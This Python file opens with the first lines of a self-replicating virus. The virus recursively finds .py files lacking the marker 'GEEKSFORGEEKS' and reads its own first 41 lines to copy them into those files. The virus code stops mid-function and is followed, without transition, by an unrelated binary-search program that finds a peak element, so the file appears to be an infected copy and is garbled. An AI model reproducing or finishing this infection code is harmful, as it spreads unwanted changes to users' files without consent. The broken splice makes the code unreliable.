#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A python3 program to find a peak
# element using divide and conquer

# A binary search based function
# that returns index of a peak element
def findPeakUtil(arr, low, high, n):
	
	# Find index of middle element
	# low + (high - low) / 2
	mid = low + (high - low)/2
	mid = int(mid)
	
	# Compare middle element with its
	# neighbours (if neighbours exist)
	if ((mid == 0 or arr[mid - 1] <= arr[mid]) and
		(mid == n - 1 or arr[mid + 1] <= arr[mid])):
		return mid


	# If middle element is not peak and
	# its left neighbour is greater
	# than it, then left half must
	# have a peak element
	elif (mid > 0 and arr[mid - 1] > arr[mid]):
		return findPeakUtil(arr, low, (mid - 1), n)

	# If middle element is not peak and
	# its right neighbour is greater
	# than it, then right half must
	# have a peak element
	else:
		return findPeakUtil(arr, (mid + 1), high, n)


# A wrapper over recursive
# function findPeakUtil()
def findPeak(arr, n):

	return findPeakUtil(arr, 0, n - 1, n)


# Driver code
arr = [1, 3, 20, 4, 1, 0]
n = len(arr)
print("Index of a peak point is", findPeak(arr, n))
	
# This code is contributed by
# Smitha Dinesh Semwal
# Time Complexity: O(log(N)) - Where n is the number of elements in the input array. In each step our search becomes half. So it can be compared to Binary search
# Space Complexity: O(log(N)) - As recursive call is there, hence implcit stack is used